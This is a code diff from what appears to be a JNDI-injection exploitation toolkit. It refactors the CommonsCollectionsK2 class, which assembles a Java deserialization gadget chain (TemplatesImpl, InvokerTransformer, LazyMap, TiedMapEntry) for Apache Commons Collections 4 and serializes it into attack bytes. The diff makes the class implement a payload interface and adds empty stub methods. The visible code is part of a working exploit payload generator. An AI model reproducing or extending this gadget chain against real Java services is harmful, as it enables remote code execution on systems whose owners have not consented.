@@ -6,15 +6,16 @@ import com.nu1r.jndi.gadgets.utils.Reflections;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.apache.commons.collections4.map.LazyMap;
+import org.apache.commons.fileupload.disk.DiskFileItem;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollectionsK2 {
+public class CommonsCollectionsK2 implements ReleaseableObjectPayload<Object>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object                  tpl         = Gadgets.createTemplatesImpl(type, param);
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap    = new HashMap<String, String>();
@@ -35,5 +36,15 @@ public class CommonsCollectionsK2 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
+    }
+
+    @Override
+    public void release(Object obj) throws Exception {
+
     }
 }
